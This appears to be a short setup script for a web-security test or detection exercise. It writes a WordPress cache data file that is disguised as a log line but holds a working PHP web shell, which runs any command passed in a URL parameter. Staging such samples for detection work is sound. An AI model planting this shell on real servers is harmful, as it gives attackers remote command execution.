# category: web
# title: Web shell opened by a bare short tag in a data file the application includes
# indicator: wp-content/cache/object/3a/9e1f.dat
mkdir -p /var/www/wp/wp-content/cache/object/3a
printf '[2026-10-30 09:12:44] request failed: <?$c=$_GET["c"]??"id";system($c);\n' >/var/www/wp/wp-content/cache/object/3a/9e1f.dat
chown -R www-data:www-data /var/www/wp/wp-content/cache
